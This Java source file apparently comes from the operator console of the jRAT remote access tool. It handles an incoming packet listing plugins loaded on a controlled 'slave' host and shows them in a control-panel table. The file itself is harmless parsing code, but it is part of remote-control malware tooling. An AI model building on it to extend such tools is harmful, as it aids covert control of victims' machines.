package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlLoadedPlugins;

import java.io.DataInputStream;


public class Packet16LoadedPlugins extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();
		String[] plugins = new String[len];
		
		for (int i = 0; i < len; i++) {
			plugins[i] = slave.readLine();
		}
		
		slave.setPlugins(plugins);

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlLoadedPlugins panel = (PanelControlLoadedPlugins) frame.panels.get("view installed plugins");

			if (panel != null) {
				for (String name : plugins) {
					panel.getModel().addRow(new Object[] { name });
				}
			}
		}
	}

}
